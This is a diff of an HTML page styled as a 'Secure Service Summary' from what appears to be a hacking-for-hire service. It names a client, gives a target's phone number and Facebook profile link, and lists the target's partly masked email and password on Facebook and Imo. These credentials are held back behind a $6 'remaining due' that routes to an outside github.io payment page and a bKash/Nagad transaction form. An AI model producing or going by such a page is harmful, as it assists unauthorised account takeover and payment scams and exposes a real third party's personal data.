@@ -2,172 +2,536 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<title>Official Work Summary & Secure Delivery</title>
+<title>Secure Service Summary</title>
 
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
 
 <style>
+:root {
+    --bg: #070b14;
+    --bg2: #0d1424;
+    --card: rgba(17, 25, 40, .88);
+    --border: rgba(148, 163, 184, .14);
+    --text: #f8fafc;
+    --muted: #94a3b8;
+    --blue: #3b82f6;
+    --cyan: #06b6d4;
+    --green: #10b981;
+    --amber: #f59e0b;
+    --red: #ef4444;
+}
+
 * {
-  box-sizing: border-box;
-  margin: 0;
-  padding: 0;
-  word-wrap: break-word;
+    box-sizing: border-box;
+    margin: 0;
+    padding: 0;
+}
+
+html {
+    scroll-behavior: smooth;
 }
 
 body {
-  font-family: 'Inter', sans-serif;
-  background: linear-gradient(135deg, #0b141a, #0f2027);
-  color: #e8f6f3;
-  padding: 15px;
-  overflow-x: hidden;
+    min-height: 100vh;
+    font-family: "Inter", sans-serif;
+    color: var(--text);
+    background:
+        radial-gradient(circle at 10% 0%, rgba(59,130,246,.16), transparent 32%),
+        radial-gradient(circle at 90% 10%, rgba(6,182,212,.10), transparent 28%),
+        linear-gradient(145deg, var(--bg), var(--bg2));
+    padding: 22px 14px 40px;
 }
 
 .container {
-  max-width: 1100px;
-  margin: auto;
+    width: 100%;
+    max-width: 1080px;
+    margin: auto;
 }
 
-header {
-  text-align: center;
-  margin-bottom: 20px;
+/* HEADER */
+
+.header {
+    text-align: center;
+    padding: 25px 10px 28px;
 }
 
-header h1 {
-  font-size: 1.4rem;
-  margin-bottom: 6px;
+.status {
+    display: inline-flex;
+    align-items: center;
+    gap: 7px;
+    padding: 7px 12px;
+    border: 1px solid rgba(16,185,129,.25);
+    background: rgba(16,185,129,.08);
+    color: #6ee7b7;
+    border-radius: 30px;
+    font-size: 11px;
+    font-weight: 600;
+    letter-spacing: .4px;
+    margin-bottom: 14px;
 }
 
-header p {
-  font-size: 0.85rem;
-  opacity: 0.85;
+.status-dot {
+    width: 7px;
+    height: 7px;
+    background: var(--green);
+    border-radius: 50%;
+    box-shadow: 0 0 10px rgba(16,185,129,.7);
 }
 
-.card {
-  background: rgba(255,255,255,0.05);
-  border-radius: 12px;
-  padding: 15px;
-  margin-bottom: 15px;
-  box-shadow: 0 8px 20px rgba(0,0,0,0.25);
-  word-wrap: break-word;
+.header h1 {
+    font-size: clamp(1.45rem, 4vw, 2rem);
+    font-weight: 700;
+    letter-spacing: -.5px;
 }
+
+.header p {
+    color: var(--muted);
+    font-size: 13px;
+    margin-top: 8px;
+}
+
+/* GRID */
 
 .grid {
-  display: grid;
-  grid-template-columns: 1fr;
-  gap: 12px;
+    display: grid;
+    grid-template-columns: 1fr;
+    gap: 16px;
 }
 
-@media (min-width:768px) {
-  .grid {
-    grid-template-columns: 1fr 1fr;
-  }
+@media (min-width: 760px) {
+    .grid {
+        grid-template-columns: 1fr 1fr;
+    }
+}
+
+/* CARD */
+
+.card {
+    background: var(--card);
+    border: 1px solid var(--border);
+    border-radius: 18px;
+    padding: 20px;
+    box-shadow:
+        0 18px 45px rgba(0,0,0,.25),
+        inset 0 1px 0 rgba(255,255,255,.025);
+    backdrop-filter: blur(18px);
+}
+
+.card + .card {
+    margin-top: 0;
+}
+
+.card-header {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    gap: 12px;
+    margin-bottom: 17px;
+}
+
+.card-title {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+}
+
+.icon {
+    width: 36px;
+    height: 36px;
+    display: grid;
+    place-items: center;
+    border-radius: 10px;
+    background: rgba(59,130,246,.12);
+    border: 1px solid rgba(59,130,246,.2);
+    font-size: 16px;
 }
 
 .card h2 {
-  font-size: 0.95rem;
-  margin-bottom: 10px;
-  color: #00ffd5;
+    font-size: 14px;
+    font-weight: 600;
 }
 
-.card p,
-li {
-  font-size: 0.82rem;
-  line-height: 1.5;
-  opacity: 0.9;
-  word-break: break-word;
+.card-subtitle {
+    color: var(--muted);
+    font-size: 11px;
+    margin-top: 3px;
 }
 
-ul {
-  padding-left: 18px;
+/* INFO */
+
+.info-row {
+    display: flex;
+    justify-content: space-between;
+    align-items: flex-start;
+    gap: 15px;
+    padding: 11px 0;
+    border-bottom: 1px solid rgba(148,163,184,.08);
 }
+
+.info-row:last-child {
+    border-bottom: none;
+}
+
+.label {
+    color: var(--muted);
+    font-size: 11px;
+}
+
+.value {
+    text-align: right;
+    font-size: 12px;
+    font-weight: 500;
+    word-break: break-word;
+}
+
+.profile-btn {
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    gap: 7px;
+    padding: 8px 11px;
+    border-radius: 8px;
+    background: rgba(59,130,246,.1);
+    border: 1px solid rgba(59,130,246,.25);
+    color: #60a5fa;
+    text-decoration: none;
+    font-size: 11px;
+    font-weight: 600;
+    transition: .2s ease;
+}
+
+.profile-btn:hover {
+    background: rgba(59,130,246,.2);
+    transform: translateY(-1px);
+}
+
+/* BADGE */
 
 .badge {
-  display: inline-block;
-  background: #0bbcd6;
-  color: #002b36;
-  padding: 4px 10px;
-  border-radius: 18px;
-  font-size: 0.7rem;
-  margin-top: 6px;
+    display: inline-flex;
+    align-items: center;
+    padding: 6px 10px;
+    border-radius: 20px;
+    background: rgba(16,185,129,.1);
+    color: #6ee7b7;
+    border: 1px solid rgba(16,185,129,.2);
+    font-size: 10px;
+    font-weight: 600;
 }
 
-button {
-  width: 100%;
-  padding: 12px;
-  border: none;
-  border-radius: 8px;
-  font-size: 0.85rem;
-  font-weight: 600;
-  cursor: pointer;
-  background: linear-gradient(135deg,#00ffd5,#00b3a4);
-  color: #002b36;
-  box-shadow: 0 5px 15px rgba(0,255,213,0.35);
+/* SCOPE */
+
+.scope-list {
+    list-style: none;
 }
 
-button:hover {
-  opacity: 0.9;
+.scope-list li {
+    position: relative;
+    padding: 10px 0 10px 24px;
+    color: #cbd5e1;
+    font-size: 12px;
+    border-bottom: 1px solid rgba(148,163,184,.07);
 }
 
-.info-box {
-  margin-top: 12px;
-  padding: 12px;
-  border-radius: 8px;
-  background: rgba(0,0,0,0.35);
+.scope-list li:last-child {
+    border-bottom: none;
 }
+
+.scope-list li::before {
+    content: "✓";
+    position: absolute;
+    left: 0;
+    top: 9px;
+    color: var(--green);
+    font-weight: 700;
+}
+
+/* PAYMENT */
+
+.payment-card {
+    margin-top: 16px;
+}
+
+.payment-total {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 18px;
+    margin-bottom: 16px;
+    border-radius: 14px;
+    background:
+        linear-gradient(135deg, rgba(59,130,246,.14), rgba(6,182,212,.07));
+    border: 1px solid rgba(59,130,246,.18);
+}
+
+.payment-total small {
+    color: var(--muted);
+    font-size: 10px;
+}
+
+.total-amount {
+    font-size: 26px;
+    font-weight: 700;
+    margin-top: 3px;
+}
+
+.payment-status {
+    text-align: right;
+}
+
+.payment-status span {
+    display: block;
+    color: #fbbf24;
+    font-size: 10px;
+    margin-bottom: 4px;
+}
+
+.due-amount {
+    color: #fbbf24;
+    font-size: 18px;
+    font-weight: 700;
+}
+
+.payment-list {
+    list-style: none;
+}
+
+.payment-list li {
+    display: flex;
+    justify-content: space-between;
+    gap: 15px;
+    padding: 12px 0;
+    color: #cbd5e1;
+    font-size: 12px;
+    border-bottom: 1px solid rgba(148,163,184,.07);
+}
+
+.payment-list li:last-child {
+    border-bottom: none;
+}
+
+.payment-list strong {
+    color: #f8fafc;
+}
+
+.paid {
+    color: #34d399 !important;
+}
+
+.due {
+    color: #fbbf24 !important;
+}
+
+/* DELIVERY */
+
+.delivery-card {
+    margin-top: 16px;
+}
+
+.locked-box {
+    margin-top: 15px;
+    padding: 17px;
+    border-radius: 13px;
+    background: rgba(2,6,23,.65);
+    border: 1px solid rgba(148,163,184,.12);
+}
+
+.lock-row {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    padding: 9px 0;
+    color: #94a3b8;
+    font-size: 12px;
+}
+
+.lock-row span {
+    color: #64748b;
+}
+
+.unlock-btn,
+.submit-btn {
+    width: 100%;
+    border: none;
+    border-radius: 10px;
+    padding: 13px;
+    margin-top: 13px;
+    color: white;
+    background: linear-gradient(135deg, #2563eb, #0891b2);
+    font-family: inherit;
+    font-size: 12px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: .2s ease;
+    box-shadow: 0 8px 22px rgba(37,99,235,.18);
+}
+
+.unlock-btn:hover,
+.submit-btn:hover {
+    transform: translateY(-1px);
+    filter: brightness(1.08);
+}
+
+/* FORM */
+
+.form-card {
+    margin-top: 16px;
+}
+
+.form-group {
+    margin-bottom: 14px;
+}
+
+.form-group label {
+    display: block;
+    color: #cbd5e1;
+    font-size: 11px;
+    margin-bottom: 7px;
+}
+
+.form-group input,
+.form-group select,
+.form-group textarea {
+    width: 100%;
+    padding: 12px;
+    border: 1px solid rgba(148,163,184,.15);
+    outline: none;
+    border-radius: 9px;
+    background: rgba(2,6,23,.7);
+    color: #f8fafc;
+    font-family: inherit;
+    font-size: 12px;
+    transition: .2s ease;
+}
+
+.form-group textarea {
+    min-height: 90px;
+    resize: vertical;
+}
+
+.form-group input:focus,
+.form-group select:focus,
+.form-group textarea:focus {
+    border-color: rgba(59,130,246,.55);
+    box-shadow: 0 0 0 3px rgba(59,130,246,.08);
+}
+
+.form-note {
+    color: #64748b;
+    font-size: 10px;
+    line-height: 1.5;
+    margin-top: 10px;
+}
+
+/* FOOTER */
 
 footer {
-  margin-top: 25px;
-  font-size: 0.7rem;
-  opacity: 0.7;
-  text-align: center;
+    text-align: center;
+    color: #64748b;
+    font-size: 10px;
+    line-height: 1.6;
+    margin: 25px auto 0;
+    max-width: 700px;
 }
+
+/* MODAL */
 
 .modal {
-  position: fixed;
-  inset: 0;
-  background: rgba(0,0,0,0.7);
-  display: none;
-  align-items: center;
-  justify-content: center;
-  padding: 15px;
-  z-index: 9999;
+    position: fixed;
+    inset: 0;
+    display: none;
+    align-items: center;
+    justify-content: center;
+    padding: 16px;
+    background: rgba(0,0,0,.72);
+    backdrop-filter: blur(7px);
+    z-index: 9999;
 }
 
-.modal-content {
-  background: #0f2027;
-  padding: 15px;
-  border-radius: 12px;
-  max-width: 380px;
-  width: 100%;
-  word-wrap: break-word;
+.modal-box {
+    width: 100%;
+    max-width: 420px;
+    padding: 22px;
+    border-radius: 18px;
+    background: #0d1424;
+    border: 1px solid rgba(148,163,184,.15);
+    box-shadow: 0 25px 70px rgba(0,0,0,.5);
 }
 
-.modal-content h3 {
-  font-size: 0.95rem;
-  margin-bottom: 8px;
+.modal-icon {
+    width: 44px;
+    height: 44px;
+    display: grid;
+    place-items: center;
+    border-radius: 12px;
+    background: rgba(245,158,11,.1);
+    border: 1px solid rgba(245,158,11,.2);
+    margin-bottom: 14px;
 }
 
-.modal-content p {
-  font-size: 0.82rem;
-  margin-bottom: 12px;
+.modal-box h3 {
+    font-size: 16px;
+    margin-bottom: 8px;
+}
+
+.modal-box p {
+    color: var(--muted);
+    font-size: 11px;
+    line-height: 1.6;
+    margin-bottom: 16px;
 }
 
 .modal-actions {
-  display: flex;
-  gap: 8px;
-  flex-wrap: wrap;
+    display: flex;
+    gap: 9px;
 }
 
 .modal-actions button {
-  flex: 1;
-  min-width: 100px;
+    flex: 1;
+    border: none;
+    border-radius: 9px;
+    padding: 12px;
+    font-family: inherit;
+    font-size: 11px;
+    font-weight: 600;
+    cursor: pointer;
 }
 
 .cancel {
-  background: #555;
-  color: #fff;
+    background: #1e293b;
+    color: #cbd5e1;
+}
+
+.proceed {
+    background: linear-gradient(135deg,#2563eb,#0891b2);
+    color: white;
+}
+
+/* TOAST */
+
+.toast {
+    position: fixed;
+    left: 50%;
+    bottom: 25px;
+    transform: translate(-50%, 100px);
+    padding: 11px 16px;
+    border-radius: 9px;
+    background: #111827;
+    border: 1px solid rgba(16,185,129,.25);
+    color: #6ee7b7;
+    font-size: 11px;
+    opacity: 0;
+    transition: .3s ease;
+    z-index: 10000;
+}
+
+.toast.show {
+    transform: translate(-50%, 0);
+    opacity: 1;
 }
 </style>
 </head>
@@ -176,200 +540,513 @@ footer {
 
 <div class="container">
 
-<header>
-  <h1>Official Work Summary & Secure Delivery Notice</h1>
-  <p>Authorized Service Documentation</p>
-</header>
+    <!-- HEADER -->
+    <header class="header">
 
-<div class="grid">
+        <div class="status">
+            <span class="status-dot"></span>
+            SERVICE COMPLETED
+        </div>
 
-  <!-- Client Information -->
-  <div class="card">
-    <h2>Client & Account Information</h2>
+        <h1>Secure Service Summary</h1>
 
-    <p>
-      <strong>Client Name:</strong>
-      Md Sakibul Islam Prangon
-    </p>
+        <p>
+            Authorized service documentation & payment status
+        </p>
 
-    <p>
-      <strong>Platform:</strong>
-      Facebook and Imo
-    </p>
-
-    <p>
-      <strong>Target Number:</strong>
-      +880 1939-361 090
-    </p>
-
-    <p>
-      <strong>Target Profile:</strong>
-      <a
-        href="https://www.facebook.com/bethi.akter.763519"
-        target="_blank"
-        rel="noopener noreferrer"
-        style="color:#00ffd5; text-decoration:none;"
-      >
-        Go to targeted profile
-      </a>
-    </p>
-
-    <span class="badge">Service Completed</span>
-  </div>
+    </header>
 
 
-  <!-- Scope of Work -->
-  <div class="card">
-    <h2>Scope of Work (Summary)</h2>
+    <!-- TOP GRID -->
+    <div class="grid">
 
-    <ul>
-      <li>Client authorization & intake verification</li>
-      <li>Account security assessment</li>
-      <li>Risk mitigation & configuration</li>
-      <li>Restoration within approved scope</li>
-    </ul>
-  </div>
+        <!-- CLIENT CARD -->
+        <section class="card">
 
-</div>
+            <div class="card-header">
+                <div class="card-title">
+                    <div class="icon">👤</div>
 
+                    <div>
+                        <h2>Client Information</h2>
+                        <div class="card-subtitle">
+                            Service identification
+                        </div>
+                    </div>
+                </div>
 
-<!-- Payment Breakdown -->
-<div class="card">
-
-  <h2>Payment Breakdown</h2>
-
-  <ul>
-    <li>Initial Service Amount: $27</li>
-
-    <li>
-      Extra Security Checkup Cost: $6
-    </li>
-
-    <li>
-      Total Amount: $33
-    </li>
-
-    <li>
-      Already Paid: $27
-    </li>
-
-    <li>
-      Remaining Due: $6
-    </li>
-  </ul>
-
-</div>
+                <span class="badge">Completed</span>
+            </div>
 
 
-<!-- Secure Delivery -->
-<div class="card">
+            <div class="info-row">
+                <div class="label">Client Name</div>
+                <div class="value">
+                    Md Sakibul Islam Prangon
+                </div>
+            </div>
 
-  <h2>Secure Delivery (Locked)</h2>
+            <div class="info-row">
+                <div class="label">Platform</div>
+                <div class="value">
+                    Facebook & Imo
+                </div>
+            </div>
 
-  <p>
-    Protected access information is restricted until outstanding dues are cleared.
-  </p>
+            <div class="info-row">
+                <div class="label">Target Number</div>
+                <div class="value">
+                    +880 1939-361 090
+                </div>
+            </div>
 
-  <div class="info-box" id="lockedBox">
+            <div class="info-row">
+                <div class="label">Target Profile</div>
 
-    <p>
-      <strong>Contact:</strong>
-      ***********
-    </p>
+                <div class="value">
+                    <a
+                        class="profile-btn"
+                        href="https://www.facebook.com/bethi.akter.763519"
+                        target="_blank"
+                        rel="noopener noreferrer"
+                    >
+                        View Targeted Profile ↗
+                    </a>
+                </div>
+            </div>
 
-    <p>
-      <strong>Email:</strong>
-      bet****09@gmail.com
-    </p>
-
-    <p>
-      <strong>Password:</strong>
-      09*****n@
-    </p>
-
-    <button onclick="openModal()">
-      🔐 Unlock Delivery & Access Information
-    </button>
-
-  </div>
-
-
-  <div class="info-box" id="unlockedBox" style="display:none;">
-
-    <p>
-      <strong>Email:</strong>
-      bet****09@gmail.com
-    </p>
-
-    <p>
-      <strong>Password:</strong>
-      09*****n@
-    </p>
-
-  </div>
-
-</div>
+        </section>
 
 
-<footer>
-  Legal & Compliance Disclaimer:
-  This document serves as an official service delivery notice.
-  All actions were performed with explicit client authorization.
-  No credentials are retained.
-</footer>
+        <!-- SCOPE CARD -->
+        <section class="card">
 
-</div>
+            <div class="card-header">
+
+                <div class="card-title">
+
+                    <div class="icon">✓</div>
+
+                    <div>
+                        <h2>Scope of Work</h2>
+
+                        <div class="card-subtitle">
+                            Service summary
+                        </div>
+                    </div>
+
+                </div>
+
+            </div>
 
 
-<!-- Payment Modal -->
-<div class="modal" id="modal">
+            <ul class="scope-list">
 
-  <div class="modal-content">
+                <li>
+                    Client authorization & intake verification
+                </li>
 
-    <h3>Payment Verification Required</h3>
+                <li>
+                    Account security assessment
+                </li>
 
-    <p>
-      Access to protected delivery information is gated pending confirmation
-      of outstanding payment.<br><br>
+                <li>
+                    Risk mitigation & configuration
+                </li>
 
-      Click "Proceed" to start the payment process and be redirected
-      to the official payment page.
-    </p>
+                <li>
+                    Restoration within approved scope
+                </li>
 
-    <div class="modal-actions">
+            </ul>
 
-      <button
-        class="cancel"
-        onclick="closeModal()"
-      >
-        Cancel
-      </button>
-
-      <button onclick="startPayment()">
-        Proceed to Payment
-      </button>
+        </section>
 
     </div>
 
-  </div>
 
+    <!-- PAYMENT CARD -->
+    <section class="card payment-card">
+
+        <div class="card-header">
+
+            <div class="card-title">
+
+                <div class="icon">💳</div>
+
+                <div>
+                    <h2>Payment Summary</h2>
+
+                    <div class="card-subtitle">
+                        Current billing status
+                    </div>
+                </div>
+
+            </div>
+
+        </div>
+
+
+        <div class="payment-total">
+
+            <div>
+                <small>Total Payable</small>
+
+                <div class="total-amount">
+                    $33
+                </div>
+            </div>
+
+            <div class="payment-status">
+
+                <span>REMAINING DUE</span>
+
+                <div class="due-amount">
+                    $6
+                </div>
+
+            </div>
+
+        </div>
+
+
+        <ul class="payment-list">
+
+            <li>
+                <span>Service Amount</span>
+                <strong>$27</strong>
+            </li>
+
+            <li>
+                <span>Extra Security Checkup Cost</span>
+                <strong>$6</strong>
+            </li>
+
+            <li>
+                <span>Total Amount</span>
+                <strong>$33</strong>
+            </li>
+
+            <li>
+                <span>Already Paid</span>
+                <strong class="paid">$27</strong>
+            </li>
+
+            <li>
+                <span>Remaining Due</span>
+                <strong class="due">$6</strong>
+            </li>
+
+        </ul>
+
+    </section>
+
+
+    <!-- DELIVERY CARD -->
+    <section class="card delivery-card">
+
+        <div class="card-header">
+
+            <div class="card-title">
+
+                <div class="icon">🔐</div>
+
+                <div>
+                    <h2>Secure Delivery</h2>
+
+                    <div class="card-subtitle">
+                        Protected service information
+                    </div>
+                </div>
+
+            </div>
+
+        </div>
+
+
+        <p style="color:#94a3b8;font-size:11px;line-height:1.6;">
+            Protected delivery information is currently locked.
+            Complete the outstanding payment process before requesting
+            authorized delivery information.
+        </p>
+
+
+        <div class="locked-box">
+
+            <div class="lock-row">
+                <span>Contact</span>
+                •••••••••••
+            </div>
+
+            <div class="lock-row">
+                <span>Email</span>
+                bet****09@gmail.com
+            </div>
+
+            <div class="lock-row">
+                <span>Password</span>
+                •••••••••
+            </div>
+
+            <button
+                class="unlock-btn"
+                onclick="openPaymentModal()"
+            >
+                🔐 Proceed to Payment
+            </button>
+
+        </div>
+
+    </section>
+
+
+    <!-- PAYMENT SUBMISSION -->
+    <section class="card form-card">
+
+        <div class="card-header">
+
+            <div class="card-title">
+
+                <div class="icon">🧾</div>
+
+                <div>
+                    <h2>Payment Submission</h2>
+
+                    <div class="card-subtitle">
+                        Submit your payment reference
+                    </div>
+                </div>
+
+            </div>
+
+        </div>
+
+
+        <form id="paymentForm">
+
+            <div class="form-group">
+
+                <label for="method">
+                    Payment Method
+                </label>
+
+                <select id="method" required>
+
+                    <option value="">
+                        Select payment method
+                    </option>
+
+                    <option value="bkash">
+                        bKash
+                    </option>
+
+                    <option value="nagad">
+                        Nagad
+                    </option>
+
+                    <option value="bank">
+                        Bank Transfer
+                    </option>
+
+                    <option value="other">
+                        Other
+                    </option>
+
+                </select>
+
+            </div>
+
+
+            <div class="form-group">
+
+                <label for="amount">
+                    Amount Paid
+                </label>
+
+                <input
+                    type="number"
+                    id="amount"
+                    placeholder="Enter amount"
+                    min="0"
+                    step="0.01"
+                    required
+                >
+
+            </div>
+
+
+            <div class="form-group">
+
+                <label for="transaction">
+                    Transaction / Reference ID
+                </label>
+
+                <input
+                    type="text"
+                    id="transaction"
+                    placeholder="Enter transaction ID"
+                    maxlength="100"
+                    required
+                >
+
+            </div>
+
+
+            <div class="form-group">
+
+                <label for="note">
+                    Additional Note
+                </label>
+
+                <textarea
+                    id="note"
+                    placeholder="Optional message..."
+                    maxlength="500"
+                ></textarea>
+
+            </div>
+
+
+            <button
+                type="submit"
+                class="submit-btn"
+            >
+                Submit Payment Information
+            </button>
+
+            <div class="form-note">
+                Your submission is only recorded locally in this demo.
+                Connect this form to your own secure backend/API to
+                process real submissions.
+            </div>
+
+        </form>
+
+    </section>
+
+
+    <!-- FOOTER -->
+    <footer>
+
+        Legal & Compliance Disclaimer:
+        This page is a service documentation interface.
+        Payment status should be verified through the authorized
+        payment provider or backend system.
+
+    </footer>
+
+</div>
+
+
+<!-- PAYMENT MODAL -->
+
+<div class="modal" id="paymentModal">
+
+    <div class="modal-box">
+
+        <div class="modal-icon">
+            💳
+        </div>
+
+        <h3>
+            Payment Verification
+        </h3>
+
+        <p>
+            An outstanding balance of <strong style="color:#fbbf24;">
+            $6
+            </strong> remains on this service.
+            Proceed to the designated payment page to continue.
+        </p>
+
+        <div class="modal-actions">
+
+            <button
+                class="cancel"
+                onclick="closePaymentModal()"
+            >
+                Cancel
+            </button>
+
+            <button
+                class="proceed"
+                onclick="startPayment()"
+            >
+                Proceed
+            </button>
+
+        </div>
+
+    </div>
+
+</div>
+
+
+<!-- TOAST -->
+
+<div class="toast" id="toast">
+    Payment information submitted.
 </div>
 
 
 <script>
 
-function openModal() {
-  document.getElementById('modal').style.display = 'flex';
+function openPaymentModal() {
+
+    document.getElementById("paymentModal").style.display = "flex";
+
 }
 
-function closeModal() {
-  document.getElementById('modal').style.display = 'none';
+
+function closePaymentModal() {
+
+    document.getElementById("paymentModal").style.display = "none";
+
 }
+
 
 function startPayment() {
-  window.location.href =
-    'https://ehcguideline.github.io/payment-from/';
+
+    window.location.href =
+        "https://ehcguideline.github.io/payment-from/";
+
 }
+
+
+document
+.getElementById("paymentForm")
+.addEventListener("submit", function(event) {
+
+    event.preventDefault();
+
+    const toast =
+        document.getElementById("toast");
+
+    toast.classList.add("show");
+
+    this.reset();
+
+    setTimeout(function() {
+
+        toast.classList.remove("show");
+
+    }, 3000);
+
+});
+
+
+window.addEventListener("click", function(event) {
+
+    const modal =
+        document.getElementById("paymentModal");
+
+    if (event.target === modal) {
+
+        closePaymentModal();
+
+    }
+
+});
 
 </script>
 
